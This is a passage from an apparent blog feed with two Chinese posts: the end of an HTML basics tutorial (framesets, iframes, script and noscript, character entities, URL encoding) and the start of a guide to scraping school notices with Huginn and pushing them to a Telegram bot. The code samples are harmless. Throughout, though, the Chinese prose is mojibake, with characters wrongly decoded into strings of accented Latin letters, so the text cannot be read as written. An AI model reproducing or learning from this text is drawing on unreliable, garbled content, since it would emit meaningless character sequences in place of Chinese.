è¡Œ <strong>æˆ–</strong> åˆ—ã€‚</p><p>rows/columns çš„å€¼è§„å®šäº†æ¯è¡Œæˆ–æ¯åˆ—å æ®å±å¹•çš„é¢ç§¯ã€‚</p><h3 id="æ¡†æ¶æ ‡ç­¾-frame"><a href="#æ¡†æ¶æ ‡ç­¾-frame" class="headerlink" title="æ¡†æ¶æ ‡ç­¾ frame"></a>æ¡†æ¶æ ‡ç­¾ frame</h3><p><code>frame</code> æ ‡ç­¾å®šä¹‰äº†æ”¾ç½®åœ¨æ¯ä¸ªæ¡†æ¶ä¸­çš„ HTML æ–‡æ¡£ã€‚</p><p>ä¾‹å¦‚ï¼Œä¸‹é¢è¿™ä¸ªä¾‹å­å®šä¹‰äº†ä¸€ä¸ªä¸¤åˆ—æ¡†æ¶é›†ï¼Œç¬¬ä¸€åˆ—å çª—å£çš„25%ï¼Œæ˜¾ç¤º<code>frame_a.htm</code>ï¼›ç¬¬äºŒåˆ—å 75%ï¼Œæ˜¾ç¤º<code>frame_b.htm</code>ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>25%,75%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>frame_a.htm<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>frame_b.htm<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>å‡å¦‚ä¸€ä¸ªæ¡†æ¶æœ‰å¯è§è¾¹æ¡†ï¼Œç”¨æˆ·å¯ä»¥æ‹–åŠ¨è¾¹æ¡†æ¥æ”¹å˜å®ƒçš„å¤§å°ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œå¯ä»¥åœ¨ <code>&lt;frame&gt;</code> æ ‡ç­¾ä¸­åŠ å…¥ï¼š<code>noresize="noresize"</code>ã€‚</p><p>å³ï¼ˆæ­¤å¤„åˆ†æˆä¸¤è¡Œ<code>rows</code>ï¼‰</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>25%,75%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>frame_a.htm<span class="token punctuation">"</span></span> <span class="token attr-name">noresize</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noresize<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>frame_b.htm<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="noframes-æ ‡ç­¾"><a href="#noframes-æ ‡ç­¾" class="headerlink" title="noframes æ ‡ç­¾"></a>noframes æ ‡ç­¾</h3><p><strong>ä¸èƒ½å°† <code>&lt;body&gt;&lt;/body&gt;</code> æ ‡ç­¾ä¸ <code>&lt;frameset&gt;&lt;/frameset&gt;</code>  æ ‡ç­¾åŒæ—¶ä½¿ç”¨ï¼</strong></p><p>ä¸è¿‡ï¼Œå‡å¦‚æ·»åŠ åŒ…å«ä¸€æ®µæ–‡æœ¬çš„ <code>&lt;noframes&gt;</code> æ ‡ç­¾ï¼Œå°±å¿…é¡»å°†è¿™æ®µæ–‡å­—åµŒå¥—äº  <code>&lt;body&gt;&lt;/body&gt;</code> æ ‡ç­¾å†…ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>25%,50%,25%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/example/html/frame_a.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/example/html/frame_b.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/example/html/frame_c.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noframes</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>æ‚¨çš„æµè§ˆå™¨æ— æ³•å¤„ç†æ¡†æ¶ï¼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noframes</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="æ··åˆæ¡†æ¶ç»“æ„"><a href="#æ··åˆæ¡†æ¶ç»“æ„" class="headerlink" title="æ··åˆæ¡†æ¶ç»“æ„"></a>æ··åˆæ¡†æ¶ç»“æ„</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50%,50%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/example/html/frame_a.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>25%,75%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/example/html/frame_b.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/example/html/frame_c.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p><img src="/2020/02/14/FrontEnd_HTML_Basic/frame.png" alt="æ··åˆæ¡†æ¶"></p><br><h2 id="å†…åµŒæ¡†æ¶"><a href="#å†…åµŒæ¡†æ¶" class="headerlink" title="å†…åµŒæ¡†æ¶"></a>å†…åµŒæ¡†æ¶</h2><p><strong><em>Iframe</em> ç”¨äºåœ¨ç½‘é¡µå†…æ˜¾ç¤ºç½‘é¡µã€‚</strong></p><p><code>height</code> å’Œ <code>width</code> å±æ€§ç”¨äºè§„å®š <code>iframe</code> çš„é«˜åº¦å’Œå®½åº¦ã€‚</p><p>å±æ€§å€¼çš„é»˜è®¤å•ä½æ˜¯åƒç´ ï¼Œä½†ä¹Ÿå¯ä»¥ç”¨ç™¾åˆ†æ¯”æ¥è®¾å®šï¼ˆæ¯”å¦‚ â€œ80%â€ï¼‰ã€‚</p><p>å¯¹äºä¸æ”¯æŒ<code>iframe</code>çš„æµè§ˆå™¨ï¼Œå¯ä»¥æŠŠéœ€è¦çš„æç¤ºæ–‡æœ¬æ”¾ç½®åœ¨ <code>&lt;iframe&gt;</code> å’Œ <code>&lt;/iframe&gt;</code> ä¹‹é—´ã€‚</p><p>æ¯”å¦‚è¿™é‡ŒåµŒå¥—äº†ä¸€ä¸ªæˆ‘çš„åšå®¢é¦–é¡µï¼ˆå¥—å¨ƒå˜»å˜»å˜»</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>600<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒiframeå”‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></code></pre><iframe src="https://miaotony.xyz" width="600" height="400"></iframe>---<p><code>iframe</code> å¯ç”¨ä½œé“¾æ¥çš„ç›®æ ‡ï¼ˆ<code>target</code>ï¼‰ã€‚</p><p>é“¾æ¥çš„ <code>target</code> å±æ€§å¿…é¡»å¼•ç”¨ <code>iframe</code> çš„ <code>name</code> å±æ€§ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>600<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>iframe_miao<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://miaotony.xyz/friends<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>iframe_miao<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>friends<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><iframe src="https://miaotony.xyz" width="600" height="200" name="iframe_miao"></iframe><a href="https://miaotony.xyz/friends" target="iframe_miao">friends</a><p><em>ï¼ˆå¯èƒ½éƒ¨ç½²åšå®¢çš„æ—¶å€™è¿™é‡Œç”¨ä¸äº†</em></p><br><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><p><strong>script å…ƒç´ </strong></p><p><code>&lt;script&gt;</code> æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ï¼Œæ¯”å¦‚ JavaScriptã€‚</p><p><code>script</code> å…ƒç´ æ—¢å¯åŒ…å«è„šæœ¬è¯­å¥ï¼Œä¹Ÿå¯é€šè¿‡ <code>src</code> å±æ€§æŒ‡å‘å¤–éƒ¨è„šæœ¬æ–‡ä»¶ã€‚</p><p><code>&lt;noscript&gt;</code> æ ‡ç­¾æä¾›æ— æ³•ä½¿ç”¨è„šæœ¬æ—¶çš„æ›¿ä»£å†…å®¹ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noscript</span><span class="token punctuation">&gt;</span></span>Sorry, your browser does not support JavaScript!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noscript</span><span class="token punctuation">&gt;</span></span></code></pre><script type="text/javascript">    function sayhello(){        alert("Hello World!");    }</script><p><noscript>Sorry, your browser does not support JavaScript!</noscript><br><button onclick="sayhello();">ç‚¹è¿™é‡Œè¯•è¯•å‘—~</button></p><p><em>åé¢å­¦JavaScriptå†æ…¢æ…¢çœ‹ï¼ˆ</em></p><br><h2 id="å­—ç¬¦å®ä½“"><a href="#å­—ç¬¦å®ä½“" class="headerlink" title="å­—ç¬¦å®ä½“"></a>å­—ç¬¦å®ä½“</h2><p><strong>HTML ä¸­çš„é¢„ç•™å­—ç¬¦å¿…é¡»è¢«æ›¿æ¢ä¸ºå­—ç¬¦å®ä½“ã€‚</strong></p><p>å½¢å¼ç±»ä¼¼äºè¿™æ ·</p><pre class="language-none"><code class="language-none">&amp;entity_name;&amp;#entity_number;</code></pre><p>å¦‚ <code>&amp;lt;</code> æˆ– <code>&amp;#60;</code> è¡¨ç¤ºå°äºå· &lt; ã€‚</p><p>ä¸é—´æ–­ç©ºæ ¼ <code>&amp;nbsp;</code></p><br><h2 id="URL-ç¼–ç "><a href="#URL-ç¼–ç " class="headerlink" title="URL ç¼–ç "></a>URL ç¼–ç </h2><p>URLï¼Œ<em>Uniform Resource Locator</em>ï¼Œç»Ÿä¸€èµ„æºå®šä½ç¬¦ã€‚</p><p>URL åªèƒ½ä½¿ç”¨ ASCII å­—ç¬¦é›†æ¥é€šè¿‡å› ç‰¹ç½‘è¿›è¡Œå‘é€ã€‚</p><p><strong>URL ç¼–ç ä¼šå°†å­—ç¬¦è½¬æ¢ä¸ºå¯é€šè¿‡å› ç‰¹ç½‘ä¼ è¾“çš„æ ¼å¼ã€‚</strong></p><p>å®ƒä½¿ç”¨ â€œ%â€ å…¶åè·Ÿéšä¸¤ä½çš„åå…­è¿›åˆ¶æ•°æ¥æ›¿æ¢é ASCII å­—ç¬¦ã€‚</p><p>URL ä¸èƒ½åŒ…å«ç©ºæ ¼ã€‚URL ç¼–ç é€šå¸¸ä½¿ç”¨ <code>+</code> æ¥æ›¿æ¢ç©ºæ ¼ã€‚</p><p>ï¼ˆä¹‹å‰ç©CTFå°±é‡åˆ°è¿‡ä¸€ä¸ªé¢˜ï¼Œå®ƒçš„æŸä¸ªå‚æ•°é‡Œéœ€è¦è¾“å…¥åŠ å·ï¼ˆ<code>+</code>ï¼‰ï¼Œæ‰€ä»¥è¦å†™æˆ <code>%2b</code>ã€‚</p><p><br><br></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><strong>å…¥é—¨å°±åˆ°è¿™é‡Œäº†å§</strong>emmm</p><p>è™½ç„¶æœ‰ç‚¹æ¯ç‡¥ï¼Œä½†æ‰€è§æ‰€å¾—è¿˜æ˜¯æŒºæœ‰è¶£çš„å“ˆå“ˆå“ˆã€‚</p><p><strong>è¿›é˜¶</strong>å†æ¥çœ‹çœ‹HTMLçš„è¡¨å•ä¸è¾“å…¥ï¼Œè¿˜æœ‰H5ä¸­çš„æ–°å…ƒç´ ï¼Œç”»å¸ƒã€éŸ³è§†é¢‘ç­‰ç­‰ã€‚</p><p>æºœäº†æºœäº† å˜»å˜»å˜»</p>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°æƒ³æ³• | åˆ©ç”¨Huginn&amp;TelegramBotå®ç°æ•™åŠ¡é€šçŸ¥è‡ªåŠ¨çˆ¬å–ä¸æ¨é€</title>
      <link href="2020/02/11/Idea_Huginn_AAONoticeAutoPush/"/>
      <url>2020/02/11/Idea_Huginn_AAONoticeAutoPush/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰ä¸ä¹…åœ¨æœåŠ¡å™¨ä¸Šè£…å¥½äº†Huginnï¼ˆ<a href="https://miaotony.xyz/2020/02/03/Server_Huginn/">è¯¦è§è¿™é‡Œï¼šåŸºäºDockeræ­å»ºHuginn</a>ï¼‰ã€‚</p><p>è¿™å‡ å¤©æŠ˜è…¾äº†ä¸€ä¸‹ï¼Œå°è¯•ç€ç”¨å®ƒæ¥çˆ¬ç‚¹ä¸œè¥¿ç©ä¸€ä¸‹<em>ï¼ˆbushi</em></p><p>æƒ³äº†ä¸€ä¸‹ï¼Œå¹³æ—¶ä¼šå…³æ³¨<strong>æ•™åŠ¡çš„é€šçŸ¥</strong>ï¼Œæ¯æ¬¡éƒ½è¦è®¿é—®æ•™åŠ¡ç½‘ç«™ï¼Œè™½ç„¶è¯´ä¹Ÿä¸æ˜¯å¾ˆéº»çƒ¦ï¼Œä½†æˆ‘æƒ³è¦ä¸€ä¸ªè‡ªåŠ¨æ¨é€çš„å·¥å…·ã€‚æˆ–è€…è¯´ï¼Œä¸éœ€è¦æˆ‘ä¸»åŠ¨å»çœ‹æœ‰æ²¡æœ‰æ–°é€šçŸ¥ï¼Œè€Œæ˜¯æœ‰æ–°é€šçŸ¥å…¬å‘Šäº†å°±ç›´æ¥æ¨è¿‡æ¥ã€‚ï¼ˆç±»ä¼¼äºWebhookï¼Ÿ ğŸ˜ƒ</p><p>è¯´åˆ°è¿™ä¸ªï¼Œå…¶å®ä¹‹å‰åœ¨ RSSHub ä¸Šçœ‹åˆ°è¿‡ä¸€ä¸ªï¼Œä¸è¿‡ç°åœ¨å¥½åƒå¤±æ•ˆäº†ã€‚è€ƒè™‘åˆ°ç›®å‰æ²¡æœ‰æŠ˜è…¾ RSSHub çš„æ‰“ç®—ï¼Œå¹²è„†å°±ç”¨ Huginn è‡ªå·±å¼„ä¸€ä¸ªå¥½äº†ã€‚</p><p>è¯´å¹²å°±å¹²äº†å•¦ã€‚</p><p>å“¦å¯¹äº†ï¼Œæœ€ç»ˆçš„æ•ˆæœå¤§æ¦‚è¿™æ ·â€”â€”</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WeChatNotification.png" alt="WeChatNotification"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_PC.png" alt="Telegram PCç«¯"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_Mobile.png" alt="Telegram Mobile"></p><hr><h2 id="é€šçŸ¥çš„çˆ¬å–"><a href="#é€šçŸ¥çš„çˆ¬å–" class="headerlink" title="é€šçŸ¥çš„çˆ¬å–"></a>é€šçŸ¥çš„çˆ¬å–</h2><p>ä¸å…¶è¯´ä¸“é—¨æ‰“é€ ä¸€ä¸ªæ•™åŠ¡é€šçŸ¥å…¬å‘Šçš„çˆ¬å–ï¼Œä¸å¦‚è¯´è®°å½•ä¸€ä¸‹ Huginn çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•ã€‚</p><p>è¯´å®è¯ï¼Œ<strong>Huginn çš„èµ„æ–™çœŸçš„å°‘</strong>ï¼Œæ„Ÿè§‰å›½å†…éƒ½æ²¡æœ‰å¤šå°‘ä»‹ç»è¿™ä¸ªçš„ï¼Œäºæ˜¯é‡åˆ°äº†ä¸å°‘é—®é¢˜ç»å¸¸ä¸çŸ¥é“æ€ä¹ˆåŠemmmã€‚</p><h3 id="ä¸€äº›å°ä»‹ç»"><a href="#ä¸€äº›å°ä»‹ç»" class="headerlink" title="ä¸€äº›å°ä»‹ç»"></a>ä¸€äº›å°ä»‹ç»</h3><p>æ‰“å¼€ä½ å–œæ¬¢çš„æµè§ˆå™¨ï¼Œè¿›å…¥ Huginnï¼ˆé»˜è®¤ä¸º <code>127.0.0.1:3000</code>ï¼‰ï¼Œæœ€ä¸Šæ–¹æœ‰å¦‚ä¸‹å‡ ä¸ªé€‰é¡¹ã€‚</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/huginn_intro.png" alt="æ ‡é¢˜æ "></p><p>å…¶ä¸­Agentså°±æ˜¯ä½ çš„ä¸€ä¸ªä¸ªå°å…µï¼Œä»–ä»¬å¯ä»¥äº’ç›¸åä½œï¼ŒæŒ‰ç…§æµæ°´çº¿ä¾æ¬¡å®Œæˆå„è‡ªçš„ä½¿å‘½ã€‚</p><p>Scenarios å°±æ˜¯è¿™äº›å°å…µçš„é›†åˆï¼Œæˆ–è€…è¯´æ˜¯æŸç§åœºæ™¯ï¼Œå®˜æ–¹æè¿°æ˜¯</p><blockquote><p>Scenarios are named groups of Agents.  Scenarios allow you to organize your agents, and to import and export sets of Agents to share.</p></blockquote><p>æ¯”å¦‚è¯´ä½ æœ‰Aã€Bã€Cä¸‰ä¸ªAgentï¼Œä»–ä»¬å…±åŒå®Œæˆä¸€ä¸ªä»»åŠ¡ï¼Œä½ å°±å¯ä»¥æŠŠä»–ä»¬é›†åˆèµ·æ¥ä½œä¸ºä¸€ä¸ªScenarioã€‚</p><p>Events æ˜¯å°å…µä»¬æ”¶é›†æ¥çš„ä¿¡æ¯ã€‚</p><p>Credentials ç”¨æ¥è®°å½•ä¸€äº›å¸¸é‡ï¼Œæˆ–è€…è¯´æ˜¯ç¯å¢ƒå˜é‡ã€‚</p><blockquote><p>Credentials are used to store values used by many Agents. Examples might include â€œtwitter_consumer_secretâ€, â€œuser_full_nameâ€, or â€œuser_birthdayâ€.      </p></blockquote><p>åœ¨ä½¿ç”¨æ—¶ï¼Œå°±å¯ä»¥åƒ <code> {% credential Meow_API %}  </code> è¿™æ ·æ¥å¼•ç”¨ï¼Œå…¶ä¸­ <code>Meow_API</code> åœ¨ Credentials ä¸­è¿›è¡Œå®šä¹‰ã€‚</p><h3 id="å¤§ä½“æ€è·¯"><a href="#å¤§ä½“æ€è·¯" class="headerlink" title="å¤§ä½“æ€è·¯"></a>å¤§ä½“æ€è·¯</h3><p>Huginn é‡Œæœ‰å¾ˆå¤šç§ Agentï¼Œè¿™é‡Œç”¨åˆ°çš„å¯ä»¥è¯´æ˜¯æœ€å¸¸ç”¨çš„ <strong>Website Agent</strong> å’Œ <strong>Post Agent</strong> ã€‚</p><p>æ›´å¤šçš„å¯ä»¥å‚è€ƒå®˜æ–¹ Wiki çš„ä»‹ç»ï¼Œåœ¨<a href="https://github.com/huginn/huginn/wiki/Agent-Types-&amp;-Descriptions">è¿™é‡Œ</a>ã€‚</p><p>è¿™ä¸ªé¡¹ç›®çš„æ€è·¯å°±æ˜¯</p><ul><li>è®¿é—®æ•™åŠ¡ç½‘ç«™ï¼Œçˆ¬å–é€šçŸ¥å…¬å‘Šæ çš„æ ‡é¢˜åŠé“¾æ¥</li><li>æ ¹æ®å¾—åˆ°çš„é“¾æ¥ï¼Œè®¿é—®ç›¸åº”ç½‘å€ï¼Œè·å¾—é€šçŸ¥å…·ä½“å†…å®¹</li><li>å°†å¾—åˆ°çš„ä¿¡æ¯æ‰“åŒ…ï¼Œæ ¹æ® Server Chan å’Œ Telegram Bot API çš„æ ¼å¼å‘é€å³å¯</li></ul><h3 id="åˆ›å»ºè·å–ä¿¡æ¯çš„-Agent"><a href="#åˆ›å»ºè·å–ä¿¡æ¯çš„-Agent" class="headerlink" title="åˆ›å»ºè·å–ä¿¡æ¯çš„ Agent"></a>åˆ›å»ºè·å–ä¿¡æ¯çš„ Agent</h3><p><strong>Crawler_AAO #1 Get Notice URLs</strong></p><p>é€‰æ‹© Website Agentï¼Œç•Œé¢å¦‚ä¸‹ï¼š</p><p> <img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WebsiteAgent.png" alt="Website Agent"></p><p><code>Name</code>è‡ªå·±å–ä¸ªå–œæ¬¢çš„åå­—ã€‚</p><p><code>Schedule</code>å¯ä»¥æŒ‡å®šè¿è¡Œçš„å‘¨æœŸã€‚å¦‚æœåˆ—è¡¨é‡Œæ²¡æœ‰åˆé€‚çš„é€‰é¡¹çš„è¯ï¼Œå¯ä»¥é€‰æ‹©Neverï¼Œå†å¦å¤–åˆ›å»ºä¸€ä¸ª<strong>Scheduler Agent</strong>ï¼Œä»¥<a href="http://en.wikipedia.org/wiki/Cron">cron</a>æ ¼å¼è‡ªå·±å†™ä¸€ä¸ªï¼Œç„¶ååœ¨<code>Controllers</code>é‡ŒæŒ‡å‘è¿™ä¸ªScheduler Agentã€‚</p><p><code>Keep events</code>å¯ä»¥å®šä¹‰è·å¾—Eventsåä¿ç•™çš„æ—¶é—´ï¼Œè¿‡æœŸåè‡ªåŠ¨ä¼šåˆ é™¤ä¹‹å‰çš„Eventsã€‚æ¯æ¬¡çˆ¬å–åï¼Œè·å¾—æ–°çš„æ•°æ®æ‰ä½œä¸ºä¸€ä¸ªeventï¼Œå¦åˆ™ä¸ä¼šè§¦å‘ä¸€ä¸ªæ–°çš„eventï¼Œå¯ä»¥è¯´åœ¨ä¸€å®šç¨‹åº¦ä¸Šèµ·åˆ°äº†å»é‡çš„ä½œç”¨ã€‚ï¼ˆå½“ç„¶å¦‚æœè¿˜æœ‰é‡å¤çš„è¯ï¼Œå¯ä»¥åé¢å†åŠ ä¸€ä¸ª<strong>De-duplication Agent</strong>ï¼‰</p><p>å¦‚æœæ•°æ®é‡è¿‡å¤§çš„è¯æœ€å¥½ä¸è¦è®¾æˆ<code>Forever</code>ã€‚ä½†æ˜¯è¦ç¡®ä¿åœ¨ä¸‹ä¸€ä¸ª Agent èƒ½å¤Ÿåœ¨ Event è¿‡æœŸä¹‹å‰è·å–åˆ°æ•°æ®ã€‚</p><p><code>Sources</code>å°±æ˜¯ä¸Šä¸€ä¸ªAgentï¼Œ<code>Receivers</code>å°±æ˜¯ä¸‹ä¸€ä¸ªAgentã€‚å‹¾é€‰<code>Propagate immediately</code>çš„è¯ï¼Œä¸Šä¸€ä¸ªAgentè·å–åˆ°æ•°æ®ååˆ™ç«‹å³æ‰§è¡Œè¿™ä¸ªAgentï¼Œå¦åˆ™ä¼šé—´éš”ä¸€åˆ†é’Ÿå†æ‰§è¡Œã€‚ï¼ˆå¼€å¯ä¼šåŠ é‡CPUè´Ÿæ‹…ï¼‰</p><p><code>Scenarios</code>å°±æ˜¯é‚£ä¸ªAgentsçš„é›†åˆå•¦ã€‚</p><p><code>Options</code>é‡Œæ˜¯å…·ä½“çš„é…ç½®ï¼Œæ˜¯JSONçš„æ 